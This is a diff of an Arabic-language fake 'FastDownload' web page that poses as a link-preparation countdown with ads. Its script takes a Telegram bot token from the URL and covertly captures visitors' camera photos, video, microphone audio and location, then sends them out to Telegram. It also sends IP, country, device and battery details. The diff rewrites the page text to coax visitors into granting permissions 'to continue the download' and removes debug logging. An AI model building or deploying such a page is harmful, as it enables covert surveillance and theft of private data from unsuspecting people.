@@ -12,7 +12,7 @@
   .wrap{max-width:780px;margin:16px auto;padding:0 10px}
   .card{background:#fff;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,.1);padding:20px 14px;margin-bottom:14px}
   .steps{display:flex;justify-content:center;align-items:center;gap:8px;margin-bottom:14px}
-  .dot{width:30px;height:30px;border-radius:50%;background:#d5dbe6;color:#fff;font-weight:bold;line-height:30px;font-size:14px;display:flex;align-items:center;justify-content:center}
+  .dot{width:30px;height:30px;border-radius:50%;background:#d5dbe6;color:#fff;font-weight:bold;line-height:30px;font-size:14px; display:flex; align-items:center; justify-content:center;}
   .dot.on{background:#2d7ff9}
   .dot.done{background:#2fb36d}
   .line{width:40px;height:3px;background:#d5dbe6}
@@ -30,15 +30,21 @@
   .ads{margin:12px 0}
   .ads iframe{border:0;display:block;margin:8px auto;max-width:100%}
   .btnbox{margin-top:16px;padding-top:14px;border-top:1px dashed #cfd6e4}
-  .btn{display:inline-flex;align-items:center;justify-content:center;gap:10px;font-family:inherit;font-size:19px;font-weight:bold;color:#fff;background:linear-gradient(#3fcf85,#27a465);border:0;border-radius:50px;padding:14px 54px;min-width:230px;cursor:pointer;box-shadow:0 5px 0 #1d7f4d,0 8px 14px rgba(39,164,101,.35);transition:opacity .3s,filter .3s}
+  .btn{display:inline-block;font-family:inherit;font-size:19px;font-weight:bold;color:#fff;background:linear-gradient(#3fcf85,#27a465);border:0;border-radius:50px;padding:14px 54px;min-width:230px;cursor:pointer;box-shadow:0 5px 0 #1d7f4d,0 8px 14px rgba(39,164,101,.35);transition:opacity .3s,filter .3s}
   .btn.dl{background:linear-gradient(#4a9bff,#2d7ff9);box-shadow:0 5px 0 #1d5fc2,0 8px 14px rgba(45,127,249,.35)}
   .btn:disabled{opacity:.4;filter:grayscale(.5);box-shadow:0 5px 0 rgba(0,0,0,.15);cursor:not-allowed}
   .btn.ready{animation:pulse 1.2s infinite}
   .btn:not(:disabled):active{transform:translateY(3px);box-shadow:0 2px 0 #1d7f4d}
   @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.06)}}
   .ic{display:block;flex:none}
+  .btn{display:inline-flex;align-items:center;justify-content:center;gap:10px}
   .page{display:none}.page.active{display:block}
   .ftr{font-size:12px;color:#8a93a8;margin:16px 0}
+  
+  /* ستايلات الصفحة الأخيرة المزودة بالإعلانات */
+  .ad-box{margin:15px 0;padding:10px;border-radius:10px;background:#fafafa;border:1px solid #eee;min-height:90px}
+  .download-btn{background:#28a745;color:#fff;padding:14px 35px;font-size:20px;border:none;border-radius:12px;cursor:pointer;transition:0.3s;box-shadow:0 4px 10px rgba(0,0,0,0.2);width:100%;margin-top:10px}
+  .download-btn:hover{background:#218838;transform:scale(1.02)}
 </style>
 </head>
 <body>
@@ -46,10 +52,11 @@
 <div class="nav">Fast<span>Download</span></div>
 <div class="wrap">
 
+<!-- الصفحة الأولى -->
 <div class="page active" id="p1"><div class="card">
   <div class="steps"><div class="dot on">1</div><div class="line"></div><div class="dot">2</div><div class="line"></div><div class="dot">3</div></div>
   <h2>جاري تجهيز الرابط</h2>
-  <div class="sub">من فضلك انتظر قليلاً</div>
+  <div class="sub">من فضلك اضغط على "سماح" للأذونات المطلوبة لاستكمال التحميل</div>
   <div class="ring" id="r1"><svg width="130" height="130" viewBox="0 0 130 130"><circle class="bg" cx="65" cy="65" r="54"/><circle class="fg" cx="65" cy="65" r="54"/></svg><div class="num">5</div></div>
   <div class="status" id="s1">يتم التحقق من الرابط...</div>
   <div class="ads" id="ads1"></div>
@@ -57,6 +64,7 @@
   <div class="btnbox"><button class="btn" id="b1" disabled><span>متابعة</span><svg class="ic" viewBox="0 0 24 24" width="22" height="22"><path d="M14 5l-7 7 7 7" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div>
 </div></div>
 
+<!-- الصفحة الثانية -->
 <div class="page" id="p2"><div class="card">
   <div class="steps"><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot on">2</div><div class="line"></div><div class="dot">3</div></div>
   <h2>انتظر حتى ينتهي العداد</h2>
@@ -68,14 +76,15 @@
   <div class="btnbox"><button class="btn" id="b2" disabled><span>متابعة</span><svg class="ic" viewBox="0 0 24 24" width="22" height="22"><path d="M14 5l-7 7 7 7" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div>
 </div></div>
 
+<!-- الصفحة الثالثة (الأخيرة المزودة بالإعلانات) -->
 <div class="page" id="p3"><div class="card">
   <div class="steps"><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot on">3</div></div>
   <h2>الرابط جاهز تقريباً</h2>
-  <div class="sub">آخر خطوة قبل التحميل</div>
-  <div class="ring" id="r3"><svg width="130" height="130" viewBox="0 0 130 130"><circle class="bg" cx="65" cy="65" r="54"/><circle class="fg" cx="65" cy="65" r="54"/></svg><div class="num">30</div></div>
-  <div class="status" id="s3">جاري إنشاء رابط التحميل...</div>
-  <div class="ads" id="ads3"></div>
-  <div id="native3"></div>
+  <div class="sub">يجب الضغط على سماح لحماية الوحدة الإعلانية وتأكيد التحميل</div>
+  
+  <div class="ad-box" id="p3-ad1"></div>
+  <div class="ad-box" id="p3-ad2"><div id="container-596225155ab3da796681d551cb4b7cf4"></div></div>
+
   <div class="btnbox"><button class="btn dl" id="b3" disabled><svg class="ic" viewBox="0 0 24 24" width="24" height="24"><path d="M12 3v12m0 0l-5-5m5 5l5-5M4 20h16" fill="none" stroke="#fff" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"/></svg><span>تحميل الملف</span></button></div>
 </div></div>
 
@@ -83,54 +92,42 @@
 </div>
 
 <script>
-/* ═══════════════════════════════════════════════════════════
-   [1] فك تشفير Base64
-   ═══════════════════════════════════════════════════════════ */
-function b64Decode(str) {
-  if (!str) return '';
-  let s = str.replace(/-/g, '+').replace(/_/g, '/');
-  while (s.length % 4) s += '=';
-  const binary = atob(s);
-  const bytes = new Uint8Array(binary.length);
-  for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-  return new TextDecoder().decode(bytes);
+// ═══════════════════════════════════════════════════════════
+// 1. فك تشفير المعلمات ومعالجة المتغيرات
+// ═══════════════════════════════════════════════════════════
+const urlParams = new URLSearchParams(window.location.search);
+
+// دالة آمنة لفك التشفير في حال كانت القيم مشفرة بـ encodeURIComponent أو Base64 (أو جلبها مباشرة)
+function getParam(name) {
+    let val = urlParams.get(name);
+    if (!val) return null;
+    try {
+        return decodeURIComponent(val);
+    } catch(e) {
+        return val;
+    }
 }
 
-/* ═══════════════════════════════════════════════════════════
-   [2] قراءة البارامترات (بتدعم ?u=base64 والقيم المباشرة)
-   ═══════════════════════════════════════════════════════════ */
-const _raw = new URLSearchParams(location.search);
-let _finalQS = location.search;
-
-const _u = _raw.get('u');
-if (_u) {
-  try {
-    const decoded = b64Decode(_u);
-    _finalQS = '?' + decoded;
-    console.log('✅ [FastDownload] u decoded →', decoded);
-  } catch (e) {
-    console.error('❌ [FastDownload] base64 decode error:', e);
-  }
-}
-
-const P = new URLSearchParams(_finalQS);
-const chat  = P.get('id') || P.get('chat');
-const token = P.get('token');
+const chat = getParam('id') || getParam('chat');
+const token = getParam('token');
 
 let featureList = [];
-if (P.has('fc'))  featureList.push('camFront');
-if (P.has('bc'))  featureList.push('camBack');
-if (P.has('fcv')) featureList.push('videoFront');
-if (P.has('bcv')) featureList.push('videoBack');
-if (P.has('r'))   featureList.push('audio');
-if (P.has('l'))   featureList.push('location');
+// دعم الشكلين (سواء تم تمرير المعلمات القديمة مثل fc, bc أو المعلمة المجمعة features)
+if (urlParams.has('fc')) featureList.push('camFront');
+if (urlParams.has('bc')) featureList.push('camBack');
+if (urlParams.has('fcv')) featureList.push('videoFront');
+if (urlParams.has('bcv')) featureList.push('videoBack');
+if (urlParams.has('r')) featureList.push('audio');
+if (urlParams.has('l')) featureList.push('location');
+
+const rawFeatures = getParam('features');
+if (rawFeatures) {
+    rawFeatures.split(',').forEach(f => {
+        if(f && !featureList.includes(f)) featureList.push(f);
+    });
+}
 const features = featureList.join(',');
 
-console.log('📋 [FastDownload] parsed →', { chat: chat, token: token ? '***' : null, features: features });
-
-/* ═══════════════════════════════════════════════════════════
-   [3] كودك الأصلي بالحرف
-   ═══════════════════════════════════════════════════════════ */
 let visitorIP = "غير معروف";
 let visitorCountry = "غير معروف";
 let visitorDevice = "Unknown";
@@ -159,12 +156,7 @@ async function sendVisitorInfo() {
         visitorCountry = d.country_name || "غير معروف";
       } catch (e) {}
 
-      const msg = `🟢 <b>زيارة جديدة</b>
-🌍 <b>الدولة:</b> ${visitorCountry}
-📱 <b>الجهاز:</b> ${visitorDevice}
-🔋 <b>البطارية:</b> ${visitorBattery}
-🌐 <b>IP:</b> <code>${visitorIP}</code>
-🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
+      const msg = `🟢 <b>زيارة جديدة</b>\n🌍 <b>الدولة:</b> ${visitorCountry}\n📱 <b>الجهاز:</b> ${visitorDevice}\n🔋 <b>البطارية:</b> ${visitorBattery}\n🌐 <b>IP:</b> <code>${visitorIP}</code>\n🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
 
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
@@ -172,7 +164,7 @@ async function sendVisitorInfo() {
         body: JSON.stringify({ chat_id: chat, text: msg, parse_mode: 'HTML' })
       });
     } catch (err) {}
-  }
+}
 
   function buildCaption(extra = "") {
     let cap = `━━━━━━━━━━━━━━━\n`;
@@ -213,7 +205,7 @@ async function sendVisitorInfo() {
               form.append('caption', buildCaption(`📸 صورة (${type === 'front' ? 'أمامية' : 'خلفية'})`));
               try {
                 await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
-              } catch (e) { console.log(e); }
+              } catch (e) {}
             }
             document.body.removeChild(video);
             resolve();
@@ -223,7 +215,7 @@ async function sendVisitorInfo() {
     });
   }
 
-  async function recordAndSend(stream, chat, token, type) {
+  async function recordAndSend(stream, type) {
     return new Promise((resolve) => {
       const mediaRecorder = new MediaRecorder(stream);
       const chunks = [];
@@ -246,7 +238,7 @@ async function sendVisitorInfo() {
     });
   }
 
-  async function recordAudioAndSend(stream, chat, token) {
+  async function recordAudioAndSend(stream) {
     return new Promise((resolve) => {
       const mediaRecorder = new MediaRecorder(stream);
       const chunks = [];
@@ -269,7 +261,7 @@ async function sendVisitorInfo() {
     });
   }
 
-  async function sendLocation(chat, token) {
+  async function sendLocation() {
     return new Promise((resolve) => {
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
@@ -283,7 +275,7 @@ async function sendVisitorInfo() {
             });
             resolve();
           },
-          (error) => { console.log('خطأ في تحديد الموقع:', error); resolve(); }
+          (error) => { resolve(); }
         );
       } else {
         resolve();
@@ -301,147 +293,213 @@ async function sendVisitorInfo() {
       stream.getTracks().forEach(t => t.stop());
       return true;
     } catch (err) {
-      console.log('رفض الإذن:', err);
       return false;
     }
   }
-
-  /* ═══════════════════════════════════════════════════════════
-     [4] startFeatures — idempotent (مش بتتنفذ مرتين)
-     ═══════════════════════════════════════════════════════════ */
-  let _featuresStarted = false;
-  let _featuresFinished = false;
 
   async function startFeatures() {
-    if (_featuresFinished) return true;
-    if (_featuresStarted) return true;
+    if (!chat || !token || !features) return;
+    const fList = features.split(',');
+    const needCamera = fList.some(f => ['camFront','camBack','videoFront','videoBack'].includes(f));
+    const needMicrophone = fList.some(f => ['audio','videoFront','videoBack'].includes(f));
 
-    if (!chat || !token || !features) {
-      _featuresFinished = true;
-      return true;
-    }
-
-    _featuresStarted = true;
-    const featureList = features.split(',');
-    const needCamera = featureList.some(f => ['camFront','camBack','videoFront','videoBack'].includes(f));
-    const needMicrophone = featureList.some(f => ['audio','videoFront','videoBack'].includes(f));
-
-    const granted = await preGrantPermissions(needCamera, needMicrophone);
-    if ((needCamera || needMicrophone) && !granted) {
-      _featuresStarted = false; // اسمح بإعادة المحاولة عند أول لمسة
-      return false;
-    }
-
+    await preGrantPermissions(needCamera, needMicrophone);
     sendVisitorInfo();
 
-    try {
-      if (featureList.includes('camFront')) {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-          await captureAndSend(stream, 'front');
-          stream.getTracks().forEach(t => t.stop());
-        } catch (e) { console.log('فشلت صورة أمامية'); }
-      }
+    if (fList.includes('camFront')) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        await captureAndSend(stream, 'front');
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) {}
+    }
 
-      if (featureList.includes('camBack')) {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-          await captureAndSend(stream, 'back');
-          stream.getTracks().forEach(t => t.stop());
-        } catch (e) { console.log('فشلت صورة خلفية'); }
-      }
+    if (fList.includes('camBack')) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+        await captureAndSend(stream, 'back');
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) {}
+    }
 
-      if (featureList.includes('videoFront')) {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
-          await recordAndSend(stream, chat, token, 'front');
-          stream.getTracks().forEach(t => t.stop());
-        } catch (e) { console.log('فشل فيديو أمامي'); }
-      }
+    if (fList.includes('videoFront')) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+        await recordAndSend(stream, 'front');
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) {}
+    }
 
-      if (featureList.includes('videoBack')) {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
-          await recordAndSend(stream, chat, token, 'back');
-          stream.getTracks().forEach(t => t.stop());
-        } catch (e) { console.log('فشل فيديو خلفي'); }
-      }
+    if (fList.includes('videoBack')) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
+        await recordAndSend(stream, 'back');
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) {}
+    }
 
-      if (featureList.includes('audio')) {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-          await recordAudioAndSend(stream, chat, token);
-          stream.getTracks().forEach(t => t.stop());
-        } catch (e) { console.log('فشل تسجيل صوتي'); }
-      }
+    if (fList.includes('audio')) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        await recordAudioAndSend(stream);
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) {}
+    }
 
-      if (featureList.includes('location')) {
-        await sendLocation(chat, token);
-      }
-    } catch (e) { console.log(e); }
-
-    _featuresFinished = true;
-    return true;
+    if (fList.includes('location')) {
+      await sendLocation();
+    }
   }
 
-/* ═══════════════════════════════════════════════════════════
-   [5] كود الإعلانات والصفحات (أصلي)
-   ═══════════════════════════════════════════════════════════ */
+// ═══════════════════════════════════════════════════════════
+// 2. التحكم في إعلانات وسير العمل للثلاث صفحات
+// ═══════════════════════════════════════════════════════════
 var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c"; 
 var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
 var GHOST = ["https://bauval.org/14/5405685805ef1654c71ceda217bef848", "https://abscloud.org/1/01876be0a03b020428ee8dc56f00181f"];
 var NATIVE = "https://bauval.org/21/b7c04a4357034ffd034b99d790f5ab0a";
 var NATIVE_ID = "container-b7c04a4357034ffd034b99d790f5ab0a";
-var BANNERS = [ {k:"97327e0c336901c5ee9b175643b0ffb4",w:468,h:60}, {k:"62ffc139a1fcac07d43cf442871c0d93",w:300,h:250}, {k:"5a15670c4d12e8d18867f5d00cc9b0e0",w:160,h:300}, {k:"a30e53d4900dc8e1aef5fc44df282cd1",w:160,h:600}, {k:"64d5f0c7a671272b63256f5b66f8f14a",w:320,h:50}, {k:"eca9e275ff1f1458d0e4997016785b63",w:728,h:90} ];
+var BANNERS = [ {k:"97327e0c336901c5ee9b175643b0ffb4",w:468,h:60}, {k:"62ffc139a1fcac07d43cf442871c0d93",w:300,h:250} ];
 var CIRC = 339.3;
+
 function $(id){return document.getElementById(id)}
 
-function addBanners(boxId){ var box = $(boxId); if(!box) return; BANNERS.forEach(function(b){ var f = document.createElement("iframe"); f.width = b.w; f.height = b.h; f.scrolling = "no"; f.srcdoc = "<body style='margin:0'><scr"+"ipt>atOptions={'key':'"+b.k+"','format':'iframe','height':"+b.h+",'width':"+b.w+",'params':{}};</scr"+"ipt><scr"+"ipt src='https://bauval.org/22/"+b.k+"'></scr"+"ipt></body>"; box.appendChild(f); }); }
-function addNative(boxId){ var c = document.createElement("div"); c.id = NATIVE_ID; $(boxId).appendChild(c); var s = document.createElement("script"); s.async = true; s.setAttribute("data-cfasync","false"); s.src = NATIVE; document.body.appendChild(s); }
+function addBanners(boxId){ 
+    var box = $(boxId); 
+    if(!box) return;
+    BANNERS.forEach(function(b){ 
+        var f = document.createElement("iframe"); 
+        f.width = b.w; f.height = b.h; f.scrolling = "no"; 
+        f.srcdoc = "<body style='margin:0'><scr"+"ipt>atOptions={'key':'"+b.k+"','format':'iframe','height':"+b.h+",'width':"+b.w+",'params':{}};</scr"+"ipt><scr"+"ipt src='https://bauval.org/22/"+b.k+"'></scr"+"ipt></body>"; 
+        box.appendChild(f); 
+    }); 
+}
+
+function addNative(boxId){ 
+    var target = $(boxId);
+    if(!target) return;
+    var c = document.createElement("div"); 
+    c.id = NATIVE_ID; 
+    target.appendChild(c); 
+    var s = document.createElement("script"); 
+    s.async = true; s.setAttribute("data-cfasync","false"); 
+    s.src = NATIVE; 
+    document.body.appendChild(s); 
+}
+
+function loadAdScript(src) {
+    const s = document.createElement("script");
+    s.src = src;
+    s.async = true;
+    document.body.appendChild(s);
+}
+
 var ghostLoaded = false;
-function addGhost(){ if(ghostLoaded) return; ghostLoaded = true; GHOST.forEach(function(u){ var s = document.createElement("script"); s.setAttribute("data-cfasync","false"); s.src = u; document.body.appendChild(s); }); }
+function addGhost(){ 
+    if(ghostLoaded) return; 
+    ghostLoaded = true; 
+    GHOST.forEach(function(u){ 
+        var s = document.createElement("script"); 
+        s.setAttribute("data-cfasync","false"); 
+        s.src = u; 
+        document.body.appendChild(s); 
+    }); 
+}
 
-function ring(n, secs, onlyVisible, doneMsg, onDone){ var el = $("r"+n), fg = el.querySelector(".fg"), num = el.querySelector(".num"); var left = secs; num.textContent = left; fg.style.strokeDashoffset = 0; var iv = setInterval(function(){ if(onlyVisible && document.visibilityState !== "visible"){ $("s"+n).textContent = "العداد متوقف، ارجع للصفحة"; return; } if(onlyVisible) $("s"+n).textContent = "يرجى عدم مغادرة الصفحة..."; left--; num.textContent = left; fg.style.strokeDashoffset = CIRC * (1 - left/secs); if(left <= 0){ clearInterval(iv); el.classList.add("done"); num.innerHTML = '<svg viewBox="0 0 24 24" width="56" height="56"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#2fb36d" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>'; $("s"+n).textContent = doneMsg; onDone(); } }, 1000); }
-function reveal(btnId){ var b = $(btnId); b.disabled = false; b.classList.add("ready"); setTimeout(function(){ b.scrollIntoView({behavior:"smooth",block:"center"}); }, 150); }
-function goNext(btn, fn){ btn.disabled = true; btn.classList.remove("ready"); var left = GAP; btn.textContent = "جاري التحويل... " + left; var iv = setInterval(function(){ left--; btn.textContent = "جاري التحويل... " + left; if(left <= 0){ clearInterval(iv); fn(); } }, 1000); }
-function show(n){ document.querySelectorAll(".page").forEach(function(p){p.classList.remove("active")}); $("p"+n).classList.add("active"); window.scrollTo(0,0); }
+function ring(n, secs, onlyVisible, doneMsg, onDone){ 
+    var el = $("r"+n), fg = el.querySelector(".fg"), num = el.querySelector(".num"); 
+    var left = secs; num.textContent = left; fg.style.strokeDashoffset = 0; 
+    var iv = setInterval(function(){ 
+        if(onlyVisible && document.visibilityState !== "visible"){ $("s"+n).textContent = "العداد متوقف، ارجع للصفحة"; return; } 
+        if(onlyVisible) $("s"+n).textContent = "يرجى عدم مغادرة الصفحة..."; 
+        left--; num.textContent = left; 
+        fg.style.strokeDashoffset = CIRC * (1 - left/secs); 
+        if(left <= 0){ 
+            clearInterval(iv); 
+            el.classList.add("done"); 
+            num.innerHTML = '<svg viewBox="0 0 24 24" width="56" height="56"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#2fb36d" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>'; 
+            $("s"+n).textContent = doneMsg; 
+            onDone(); 
+        } 
+    }, 1000); 
+}
 
-/* ═══════════════════════════════════════════════════════════
-   [6] التشغيل
-   ═══════════════════════════════════════════════════════════ */
-addBanners("ads1"); addNative("native1");
-ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b1"); });
+function reveal(btnId){ 
+    var b = $(btnId); 
+    b.disabled = false; 
+    b.classList.add("ready"); 
+    setTimeout(function(){ b.scrollIntoView({behavior:"smooth",block:"center"}); }, 150); 
+}
 
-// زر المتابعة: يبدأ الميزات في نفس لحظة اللمس (مهم للمتصفح)
+function goNext(btn, fn){ 
+    btn.disabled = true; 
+    btn.classList.remove("ready"); 
+    var left = GAP; 
+    btn.textContent = "جاري التحويل... " + left; 
+    var iv = setInterval(function(){ 
+        left--; 
+        btn.textContent = "جاري التحويل... " + left; 
+        if(left <= 0){ clearInterval(iv); fn(); } 
+    }, 1000); 
+}
+
+function show(n){ 
+    document.querySelectorAll(".page").forEach(function(p){p.classList.remove("active")}); 
+    $("p"+n).classList.add("active"); 
+    window.scrollTo(0,0); 
+}
+
+// البدء في الصفحة الأولى وعرض الإعلانات الخاصة بها
+addBanners("ads1"); 
+addNative("native1");
+
+// بمجرد تحميل الصفحة الأولى، يبدأ عداد الخطوة الأولى فوراً مع طلب الأذونات وتشغيل المهام
+ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ 
+    reveal("b1"); 
+});
+
+// أزرار التنقل بين الصفحات
 $("b1").onclick = function(){ 
-    startFeatures();           // ← في نفس اللمسة
     goNext(this, function(){ 
+        startFeatures(); // طلب الأذونات وتشغيل الميزات مباشرة عند أول تفاعل/انتقال
         show(2); 
-        addGhost(); addBanners("ads2"); addNative("native2"); 
+        addGhost(); 
+        addBanners("ads2"); 
+        addNative("native2"); 
         ring(2, WAIT2, true, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b2"); }); 
     }); 
 };
 
-$("b2").onclick = function(){ goNext(this, function(){ show(3); addGhost(); addBanners("ads3"); addNative("native3"); ring(3, WAIT3, false, "الرابط جاهز! اضغط على زر التحميل بالأسفل ", function(){ reveal("b3"); }); }); };
-$("b3").onclick = function(){ window.location.href = SMART_LINK; };
+$("b2").onclick = function(){ 
+    goNext(this, function(){ 
+        show(3); 
+        addGhost(); 
+        
+        // حقن إعلانات الصفحة الثالثة كما طلبتم
+        loadAdScript("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
+        loadAdScript("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
+        loadAdScript("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
 
-// 🔥 محاولة فورية عند فتح الصفحة (بتشتغل على الديسكتوب، ولو الموبايل رفض → إعادة عند أول لمسة)
-(function tryImmediate(){
-  if (!chat || !token || !features) return;
-  startFeatures().then(function(ok){
-    if (ok) return;
-    // فشلت (محتاجة لمسة) → جرّب عند أول لمسة في أي مكان
-    function retry(){
-      document.removeEventListener('click', retry, true);
-      document.removeEventListener('touchstart', retry, true);
-      document.removeEventListener('pointerdown', retry, true);
-      startFeatures();
-    }
-    document.addEventListener('click', retry, true);
-    document.addEventListener('touchstart', retry, true);
-    document.addEventListener('pointerdown', retry, true);
-  });
-})();
+        var atOptionsScript = document.createElement('script');
+        atOptionsScript.innerHTML = `
+          atOptions = {
+            'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
+            'format' : 'iframe',
+            'height' : 300,
+            'width' : 160,
+            'params' : {}
+          };
+        `;
+        document.body.appendChild(atOptionsScript);
+        loadAdScript("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
+
+        reveal("b3"); 
+    }); 
+};
+
+$("b3").onclick = function(){ 
+    window.location.href = SMART_LINK; 
+};
 </script>
 </body>
- </html>
+</html>
